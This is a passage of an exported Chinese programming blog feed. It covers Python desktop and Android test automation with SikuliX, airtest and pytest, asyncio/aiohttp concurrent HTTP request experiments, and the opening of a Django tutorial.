class="number">2</span>)</span><br><span class="line">screen.click(<span class="string">r&quot;D:\project\pc-auto\1.png&quot;</span>)</span><br><span class="line">screen.<span class="built_in">type</span>(<span class="string">&quot;hello&quot;</span>)</span><br><span class="line"></span><br><span class="line">jpype.shutdownJVM()</span><br></pre></td></tr></table></figure>

<ul>
<li>Python调用jar包需要借助于jvm虚拟机，然后需要指定sikulixapi的安装路径,然后将jvm的路径添加到系统的path中（否则会提示jvm无法启动），然后在下方声明一个screen,app类，都是api中的类，然后就可以根据上方的一些方法进行调用</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li><p>如果使用sikuli和PyAutoGUI，最好配合cv2（opencv）进行不同分辨率适配（这里没有测试）</p>
</li>
<li><p>也有人推荐使用Ranorex ，不过这个是收费的</p>
</li>
<li><p>当然还有一些其他场景没有测试，比如嵌入浏览器的场景</p>
</li>
</ul>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pc自动化</tag>
      </tags>
  </entry>
  <entry>
    <title>py3-5-aiohttp-百万请求？</title>
    <url>/aposts/8d7c7783/</url>
    <content><![CDATA[<ul>
<li><p>找到了一篇英文文章说的就是构造百万级别http请求</p>
</li>
<li><p><a href="http://pawelmhm.github.io/asyncio/python/aiohttp/2016/04/22/asyncio-aiohttp.html">http://pawelmhm.github.io/asyncio/python/aiohttp/2016/04/22/asyncio-aiohttp.html</a> </p>
</li>
<li><p>作者对各个请求给服务器造成的情况作出了详细的对比。我就偷个懒没有。。。</p>
</li>
<li><p>基于py3.5 3.4的语法请自行度娘</p>
</li>
</ul>
<h2 id="例子一"><a href="#例子一" class="headerlink" title="例子一"></a>例子一</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"><span class="comment"># 　你使用async以及await关键字将函数异步化</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> response.read()</span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">loop,  r</span>):</span><br><span class="line">    url = <span class="string">&quot;http://gc.ditu.aliyun.com/geocoding?a=苏州市&quot;</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        task = asyncio.ensure_future(fetch(url.<span class="built_in">format</span>(i)))</span><br><span class="line">        tasks.append(task)</span><br><span class="line"></span><br><span class="line">    responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line">    <span class="comment"># 注意asyncio.gather()的用法，它搜集所有的Future对象，然后等待他们返回。</span></span><br><span class="line">    <span class="comment"># print(json.loads(responses[0].decode()))</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(responses))</span><br><span class="line"></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line">future = asyncio.ensure_future(run(loop, <span class="number">800</span>))</span><br><span class="line">loop.run_until_complete(future)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<ul>
<li>future &#x3D; asyncio.ensure_future(run(loop, 800)) 这里 构造1000个请求时，就报too many open files loop is not close 作者也遇到此问题，说是本机的socket 端口用光了？很是怀疑</li>
</ul>
<h2 id="例子二-asyncio-Semaphore解决报错问题"><a href="#例子二-asyncio-Semaphore解决报错问题" class="headerlink" title="例子二 asyncio.Semaphore解决报错问题"></a>例子二 asyncio.Semaphore解决报错问题</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">fetch</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">await</span> response.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">bound_fetch</span>(<span class="params">sem, url</span>):</span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> sem:</span><br><span class="line">        <span class="keyword">await</span> fetch(url)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">loop,  r</span>):</span><br><span class="line">    url = <span class="string">&quot;http://gc.ditu.aliyun.com/geocoding?a=苏州市&quot;</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="comment"># create instance of Semaphore</span></span><br><span class="line">    sem = asyncio.Semaphore(<span class="number">100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(r):</span><br><span class="line">        <span class="comment"># pass Semaphore to every GET request</span></span><br><span class="line">        task = asyncio.ensure_future(bound_fetch(sem, url.<span class="built_in">format</span>(i)))</span><br><span class="line">        tasks.append(task)</span><br><span class="line"></span><br><span class="line">    responses = <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line">    <span class="built_in">print</span>(responses)</span><br><span class="line">number = <span class="number">100000</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"></span><br><span class="line">future = asyncio.ensure_future(run(loop, number))</span><br><span class="line">loop.run_until_complete(future)</span><br></pre></td></tr></table></figure>
<ul>
<li>然而我用asyncio.Semaphore时，发现请求不成功，已经发了邮件给作者，没有回我。</li>
</ul>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>pytest+airtest+多设备</title>
    <url>/aposts/aee52ea9/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><a href="/aposts/6e64669e">airtest自动化测试框架</a>，使用的是<code>unittest</code>管理用例和<code>air</code>写用例，想试下使用<code>pytest</code>+<code>纯py</code>的方式，代码采用了<code>PO</code>代码接口</li>
</ul>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><ul>
<li>目录结构如下</li>
</ul>
<p><img src="/aposts/aee52ea9/image-20220419152528261.png" alt="image-20220419152528261"></p>
<ul>
<li>先看下<code>testcase</code>用例目录下的<code>conftest.py</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">from</span> py._xmlgen <span class="keyword">import</span> html</span><br><span class="line"><span class="keyword">from</span> airtest.core.api <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意pytest传参时，需要把设备编号收到传进来</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_addoption</span>(<span class="params">parser</span>):</span><br><span class="line">    parser.addoption(<span class="string">&quot;--dev&quot;</span>, action=<span class="string">&quot;store&quot;</span>, dest=<span class="string">&quot;dev&quot;</span>,default=<span class="string">&quot;设备&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@pytest.fixture(<span class="params">scope=<span class="string">&#x27;session&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dev</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">return</span> request.config.getoption(<span class="string">&quot;dev&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_poco = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># @pytest.fixture()</span></span><br><span class="line"><span class="meta">@pytest.fixture(<span class="params">scope=<span class="string">&#x27;session&#x27;</span>, autouse=<span class="literal">True</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poco</span>(<span class="params">dev</span>):</span><br><span class="line">    <span class="keyword">global</span> _poco</span><br><span class="line">    device = connect_device(<span class="string">&quot;Android://127.0.0.1:5037/%s&quot;</span> % dev)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> poco.drivers.android.uiautomation <span class="keyword">import</span> AndroidUiautomationPoco</span><br><span class="line">    _poco = AndroidUiautomationPoco(device, use_airtest_input=<span class="literal">True</span>,  screenshot_each_action=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 返回数据</span></span><br><span class="line">    <span class="keyword">yield</span> _poco</span><br><span class="line">    <span class="comment"># 实现用例后置</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_results_table_header</span>(<span class="params">cells</span>):</span><br><span class="line">    cells.insert(<span class="number">1</span>, html.th(<span class="string">&#x27;用例名称&#x27;</span>))</span><br><span class="line">    cells.insert(<span class="number">2</span>, html.th(<span class="string">&#x27;Test_nodeid&#x27;</span>))</span><br><span class="line">    cells.pop(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pytest_html_report_title</span>(<span class="params">report</span>):</span><br><span class="line">    report.title = <span class="string">&quot;pytest示例项目测试报告&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>看下页面对象代码</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> airtest.core.api <span class="keyword">import</span> snapshot, start_app, sleep, stop_app</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPage</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">home</span>(<span class="params">cls, poco</span>):</span><br><span class="line">        logging.info(<span class="string">&quot;开始测试&quot;</span>+ datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>))</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            stop_app(<span class="string">&#x27;com.jianshu.haruki&#x27;</span>)</span><br><span class="line">            start_app(<span class="string">&#x27;com.jianshu.haruki&#x27;</span>)</span><br><span class="line">            sleep(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            poco(<span class="string">&quot;com.jianshu.haruki:id/iv_home_page&quot;</span>).wait(<span class="number">10</span>).click()</span><br><span class="line">            logging.info(<span class="string">&quot;点击了首页&quot;</span>+ datetime.now().strftime(<span class="string">&quot;%H:%M:%S&quot;</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># snapshot(msg=&quot;报错后截图&quot;)</span></span><br><span class="line">            <span class="keyword">raise</span> e</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">cls</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<ul>
<li>然后用例调用<code>page</code>层</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"><span class="keyword">from</span> pages.my_page <span class="keyword">import</span> MyPage</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TestCaseTestMy</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line"><span class="meta">    @pytest.mark.finished1</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_my_01</span>(<span class="params">self, poco</span>):</span><br><span class="line">        MyPage.home(poco)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @pytest.mark.finished</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_my_02</span>(<span class="params">self, poco</span>):</span><br><span class="line">        MyPage.home(poco)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @pytest.mark.finished</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">test_my_03</span>(<span class="params">self, poco</span>):</span><br><span class="line">        MyPage.home(poco)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>运行方式一，直接输入命令</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pytest testcase/大回归/小回归/冒烟 --dev=emulator-<span class="number">5554</span>  --html=report.html --self-contained-html --capture=sys</span><br></pre></td></tr></table></figure>



<ul>
<li>运行方式二，直接运行<code>runner.py</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Process</span><br><span class="line"><span class="keyword">import</span> pytest</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">path, report, dev</span>):</span><br><span class="line">    pytest.main([<span class="string">&#x27;%s&#x27;</span> %path,<span class="string">&#x27;--dev=%s&#x27;</span>% dev, <span class="string">&#x27;--html=%s&#x27;</span> % report,<span class="string">&#x27;--self-contained-html&#x27;</span>, <span class="string">&#x27;--capture=sys&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    test_case = Process(target=main, args=(<span class="string">&quot;d:\\project\\pytest-airtest\\testcase\\大回归\\小回归\\冒烟&quot;</span>,<span class="string">&quot;report1.html&quot;</span>,<span class="string">&#x27;ZL9LC685V86DNNMN&#x27;</span>))</span><br><span class="line">    test_case.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    test_case1 = Process(target=main, args=(<span class="string">&quot;d:\\project\\pytest-airtest\\testcase\\大回归\\小回归\\&quot;</span>,<span class="string">&quot;report2.html&quot;</span>,<span class="string">&#x27;emulator-5554&#x27;</span>))</span><br><span class="line">    test_case1.start()</span><br><span class="line"></span><br><span class="line">    test_case.join()</span><br><span class="line">    test_case1.join()</span><br></pre></td></tr></table></figure>

<ul>
<li>测试报告，每个进程都生成了测试报告</li>
</ul>
<p><img src="/aposts/aee52ea9/image-20220419153433685.png" alt="image-20220419153433685"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>发现其实采用这样的方式来写代码，反而回降低用例的维护速度，无论是使用<code>airtest</code>还是<code>appium</code>,<strong>都不要太迷恋所谓的<code>PO</code>分层架构（<code>TC+PO+YML/JSON</code>）</strong>，因为这也是之前某个自动化测试框架跨公司、跨部门推广失败原因之一</li>
<li>有兴趣的话，我已经把此代码开源，可以查看<a href="https://github.com/Louis-me/pytest-airtest">github</a>或者<a href="https://gitee.com/moon-full/pytest-airtest">gitee</a></li>
</ul>
]]></content>
      <categories>
        <category>自动化测试</category>
      </categories>
      <tags>
        <tag>airtest</tag>
        <tag>pytest</tag>
      </tags>
  </entry>
  <entry>
    <title>python+asyncio发送请求</title>
    <url>/aposts/aab677c5/</url>
    <content><![CDATA[<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">​```</span><br><span class="line">import asyncio</span><br><span class="line">import aiohttp</span><br><span class="line">import json</span><br><span class="line">def fetch_page(url):</span><br><span class="line">    try:</span><br><span class="line">        response = yield from aiohttp.request(&#x27;GET&#x27;, url)</span><br><span class="line">        string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">        if response.status == 200:</span><br><span class="line">            data = json.loads(string)</span><br><span class="line">            print(data)</span><br><span class="line">        else:</span><br><span class="line">            print(&quot;data fetch failed for&quot;)</span><br><span class="line">            print(response.content, response.status)</span><br><span class="line">    except asyncio.TimeoutError:</span><br><span class="line">        print(&quot;访问失败&quot;)</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;http://gc.ditu.aliyun.com/geocoding?a=%E8%8B%8F%E5%B7%9E%E5%B8%82&#x27;</span><br><span class="line">    # urls = [url] * 4</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = []</span><br><span class="line">    for i in range(5):</span><br><span class="line">        tasks.append(asyncio.async(fetch_page(url)))</span><br><span class="line">    # tasks = [asyncio.async(fetch_page(z, i)) for i, z in enumerate(urls)]</span><br><span class="line">    print(tasks)</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks, timeout=5))</span><br><span class="line">    loop.close()</span><br><span class="line">​```</span><br><span class="line"></span><br><span class="line">封装一次</span><br><span class="line"></span><br><span class="line">​```</span><br><span class="line">class fetch():</span><br><span class="line">    def __init__(self, dict_http):</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        http请求的封装，传入dict</span><br><span class="line">        :param dict_http:</span><br><span class="line">        &#x27;&#x27;&#x27;</span><br><span class="line">        self.dict_http = dict_http</span><br><span class="line">    def get(self, url, param):</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        url = self.dict_http[&quot;protocol&quot;] + self.dict_http[&quot;host&quot;] + &quot;:&quot; + str(self.dict_http[&quot;port&quot;]) + url</span><br><span class="line">        print(url)</span><br><span class="line">        try:</span><br><span class="line">            response = yield from aiohttp.request(&quot;GET&quot;, url, headers=self.dict_http[&quot;header&quot;], params=param)</span><br><span class="line">            string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            if response.status == 200:</span><br><span class="line">                data = json.loads(string)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;data fetch failed for&quot;)</span><br><span class="line">                print(response.content, response.status)</span><br><span class="line">            data[&quot;status_code&quot;] = response.status</span><br><span class="line">            print(data)</span><br><span class="line">        except asyncio.TimeoutError:</span><br><span class="line">            print(&quot;访问失败&quot;)</span><br><span class="line">        return data</span><br><span class="line">    def post(self,url, param):</span><br><span class="line">        data = &#123;&#125;</span><br><span class="line">        url = self.dict_http[&quot;protocol&quot;] + self.dict_http[&quot;host&quot;] + &#x27;:&#x27; + str(self.dict_http[&quot;port&quot;]) + url</span><br><span class="line">        try:</span><br><span class="line">            response = yield from aiohttp.request(&#x27;POST&#x27;, url, data=param)</span><br><span class="line">            string = (yield from response.read()).decode(&#x27;utf-8&#x27;)</span><br><span class="line">            if response.status == 200:</span><br><span class="line">                data = json.loads(string)</span><br><span class="line">            else:</span><br><span class="line">                print(&quot;data fetch failed for&quot;)</span><br><span class="line">                print(response.content, response.status)</span><br><span class="line">            data[&quot;status_code&quot;] = response.status</span><br><span class="line">            print(data)</span><br><span class="line">        except asyncio.TimeoutError:</span><br><span class="line">            print(&quot;访问失败&quot;)</span><br><span class="line">        return data</span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    url = &#x27;/iplookup/iplookup.php&#x27;</span><br><span class="line">    loop = asyncio.get_event_loop()</span><br><span class="line">    tasks = []</span><br><span class="line">    dict_http = &#123;&#125;</span><br><span class="line">    dict_http[&quot;protocol&quot;] = &quot;http://&quot;</span><br><span class="line">    dict_http[&quot;host&quot;] = &quot;int.dpool.sina.com.cn&quot;</span><br><span class="line">    dict_http[&quot;port&quot;] = 80</span><br><span class="line">    dict_http[&quot;header&quot;] = &#123;&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.59 Safari/537.36&quot;&#125;</span><br><span class="line">    f = fetch(dict_http)</span><br><span class="line">    for i in range(2):</span><br><span class="line">        tasks.append(asyncio.async(f.get(url, param=&quot;format=json&amp;ip=218.4.255.255&quot;)))</span><br><span class="line">    loop.run_until_complete(asyncio.wait(tasks, timeout=5))</span><br><span class="line">    loop.close()</span><br><span class="line"></span><br><span class="line">​```</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
  </entry>
  <entry>
    <title>python django实践</title>
    <url>/aposts/dbc9f282/</url>
    <content><![CDATA[<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><ul>
<li><p>本次系列教程来自于<a href="https://www.runoob.com/django/django-tutorial.html">这里</a></p>
</li>
<li><p>本地环境</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;python --version</span><br><span class="line">Python 3.7.9</span><br></pre></td></tr></table></figure>



<h2 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h2><ul>
<li>安装django</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\Administrator&gt;python -m pip install Django</span><br></pre></td></tr></table></figure>

<ul>
<li>查看版本</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; import django</span><br><span class="line">&gt;&gt;&gt; django.get_version()</span><br><span class="line">&#x27;3.1.3&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>使用django-admin 创建项目</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj&gt;django-admin startproject StudyDjango</span><br></pre></td></tr></table></figure>

<ul>
<li>查看创建好的目录</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\StudyDjango&gt;tree /f</span><br><span class="line">│  manage.py</span><br><span class="line">│</span><br><span class="line">└─StudyDjango</span><br><span class="line">        asgi.py</span><br><span class="line">        settings.py</span><br><span class="line">        urls.py</span><br><span class="line">        wsgi.py</span><br><span class="line">        __init__.py</span><br></pre></td></tr></table></figure>

<ul>
<li>启动服务器</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\StudyDjango&gt;python manage.py runserver 0.0.0.0:8000</span><br></pre></td></tr></table></figure>

<ul>
<li>浏览器打开<code>127.0.0.1:8000</code></li>
</ul>
<p><img src="/aposts/dbc9f282/image-20230801144936413.png" alt="image-20230801144936413"></p>
<h3 id="视图和-URL-配置"><a href="#视图和-URL-配置" class="headerlink" title="视图和 URL 配置"></a>视图和 URL 配置</h3><p>在先前创建的 <code>StudyDjango</code>目录下的 <code>StudyDjango</code>目录新建一个 <code>views.py </code>文件，并输入代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//StudyDjango/StudyDjango/views.py 文件代码：</span><br><span class="line"></span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"> </span><br><span class="line">def hello(request):</span><br><span class="line">    return HttpResponse(&quot;Hello world ! &quot;)</span><br></pre></td></tr></table></figure>

<p>接着，绑定 URL 与视图函数。打开 <code>urls.py</code> 文件，删除原来代码，将以下代码复制粘贴到 <code>urls.py </code>文件中：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/StudyDjango/urls.py</span><br><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    url(r&#x27;^$&#x27;, views.hello),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>完成后，启动 Django 开发服务器，并在浏览器访问打开浏览器并访问：</p>
<p><img src="/aposts/dbc9f282/image-20230801150043592.png" alt="image-20230801150043592"></p>
<p>我们也可以修改以下规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/StudyDjango/urls.py</span><br><span class="line">from django.conf.urls import url</span><br><span class="line">from django.urls import path</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    # url(r&#x27;^$&#x27;, views.hello),</span><br><span class="line">    path(&#x27;hello/&#x27;, views.hello),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>通过浏览器打开 <code>http://127.0.0.1:8000/hello</code>，输出结果如下：</p>
<p><img src="/aposts/dbc9f282/image-20230801150312911.png" alt="image-20230801150312911"></p>
<h2 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h2><ul>
<li><p>我们使用 <code>django.http.HttpResponse() </code>来输出 “Hello World！”。该方式将数据与视图混合在一起，不符合 Django 的 MVC 思想。</p>
</li>
<li><p>将在 <code>StudyDjango</code>目录底下创建 <code>templates </code>目录并建立<code> runoob.html</code>文件，runoob.html 文件代码如下：</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/templates/runoob.html </span><br><span class="line"></span><br><span class="line">&lt;h1&gt;&#123;&#123; hello &#125;&#125;&lt;/h1&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>接下来我们需要向Django说明模板文件的路径，修改<code>HelloWorld/settings.py</code>，修改 TEMPLATES 中的 DIRS 为 <code>[os.path.join(BASE_DIR, &#39;templates&#39;)]</code>，如下所示:</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/StudyDjango/settings.py 文件代码：</span><br><span class="line"></span><br><span class="line">TEMPLATES = [</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;BACKEND&#x27;: &#x27;django.template.backends.django.DjangoTemplates&#x27;,</span><br><span class="line">        &#x27;DIRS&#x27;: [os.path.join(BASE_DIR, &#x27;templates&#x27;)],       # 修改位置</span><br><span class="line">        &#x27;APP_DIRS&#x27;: True,</span><br><span class="line">        &#x27;OPTIONS&#x27;: &#123;</span><br><span class="line">            &#x27;context_processors&#x27;: [</span><br><span class="line">                &#x27;django.template.context_processors.debug&#x27;,</span><br><span class="line">                &#x27;django.template.context_processors.request&#x27;,</span><br><span class="line">                &#x27;django.contrib.auth.context_processors.auth&#x27;,</span><br><span class="line">                &#x27;django.contrib.messages.context_processors.messages&#x27;,</span><br><span class="line">            ],</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<ul>
<li>我们现在修改 views.py，增加一个新的对象，用于向模板提交数据：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/StudyDjango/views.py</span><br><span class="line"></span><br><span class="line">from django.shortcuts import render</span><br><span class="line"> </span><br><span class="line">def runoob(request):</span><br><span class="line">    context = &#123;&#125;</span><br><span class="line">    context[&#x27;hello&#x27;] = &#x27;Hello World!&#x27;</span><br><span class="line">    return render(request, &#x27;runoob.html&#x27;, context)</span><br></pre></td></tr></table></figure>

<ul>
<li>修改urls中的路由</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// StudyDjango/StudyDjango/urls.py</span><br><span class="line"></span><br><span class="line">from django.urls import path</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    # url(r&#x27;^$&#x27;, views.hello),</span><br><span class="line">    # path(&#x27;hello/&#x27;, views.hello),</span><br><span class="line">    path(&#x27;runoob/&#x27;, views.runoob),</span><br><span class="line"></span><br><span class="line">]</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>访问最新地址</li>
</ul>
<p><img src="/aposts/dbc9f282/image-20230801152821208.png" alt="image-20230801152821208"></p>
<ul>
<li>更多模板语法参考<a href="https://www.runoob.com/django/django-template.html">这里</a></li>
</ul>
<h2 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h2><ul>
<li><p>Django 对各种数据库提供了很好的支持，包括：PostgreSQL、MySQL、SQLite、Oracle。</p>
</li>
<li><p>Django 为这些数据库提供了统一的调用API。 我们可以根据自己业务需求选择不同的数据库</p>
</li>
<li><p>本次模型使用mysql，需要安装mysq驱动</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">E:\proj\StudyDjango&gt;pip3 install pymysql</span><br></pre></td></tr></table></figure>

<blockquote>
<p>本地需要搭建好Mysql环境</p>
</blockquote>
<h3 id="Django-ORM"><a href="#Django-ORM" class="headerlink" title="Django ORM"></a>Django ORM</h3><ul>
<li><p>本地数据库中需要提前创建数据库，因为ORM 无法操作到数据库级别，只能到表。</p>
</li>
<li><p>使用heidisql连接本地mysql数据库后，新建一个数据库，名称为：runoob </p>
</li>
<li><p>我们在项目的 settings.py 文件中找到 DATABASES 配置项，将其信息修改为：</p>
</li>
</ul>
